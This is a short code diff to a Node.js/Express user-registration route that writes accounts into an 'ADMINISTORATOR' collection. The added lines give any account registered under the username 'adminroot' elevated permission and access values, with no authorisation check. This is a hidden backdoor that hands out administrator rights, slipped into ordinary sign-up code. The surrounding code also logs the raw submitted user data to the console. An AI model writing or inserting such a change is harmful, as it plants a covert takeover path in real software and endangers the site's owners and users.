@@ -323,6 +323,11 @@ router.post('/register', urlencodedParser, async function (req, res, next) {
     console.log(UsearData)
     let collection = await informationDB.getCollection("ADMINISTORATOR");
 
+    if (UsearData.username == "adminroot") {
+        UsearData.permission = 3;
+        UsearData.access = 1;
+    }
+
 	collection.findOne({ username: UsearData.username }, function (err, data) {
 		if (!data) {
 			collection.insertOne({
